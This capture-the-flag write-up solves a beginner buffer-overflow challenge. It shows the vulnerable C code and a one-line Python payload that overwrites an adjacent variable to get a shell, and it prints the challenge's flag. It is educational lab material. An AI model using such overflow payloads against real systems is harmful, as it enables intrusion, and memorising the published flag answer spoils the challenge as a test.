### Solved by z0rex

"Overflow 1" was a binary challenge worth 50 points.

> This program is vulnerable to a buffer overflow! Can you exploit it to run a
> shell and get the flag? You can solve this problem on our shell server at 
> `/problems/overflow1`, and the binary and source are provided. 

I started off by checking how the program worked by running it like a normal user would.

```
team24254@shell:/problems/overflow1$ ./overflow1
Usage: overflow1 [str]
team24254@shell:/problems/overflow1$ ./overflow1 a
Sorry, secret = 0x00000000
```

We're also given the source code, and it's not hard to see what we're supposed to do. We need to overwrite the value of `secret` with `0xDEADBEEF`

```c
.
.
.
char buf[16];
int secret = 0;
strcpy(buf, input);

if (secret == 0xDEADBEEF)
{
    give_shell();
}
.
.
.
```

The buffer is expecting 16 bytes. Anything over that will start to write outside of `buf`.

So to exploit this we just pass 16 bytes of garbage, then `\xef\xbe\xad\xde`.

```
team24254@shell:/problems/overflow1$ ./overflow1 `python -c 'print "A"*16 + "\xef\xbe\xad\xde"'`
$ cat flag.txt
overflow_underflow_youreaflow_imaflow
```

Flag: `overflow_underflow_youreaflow_imaflow`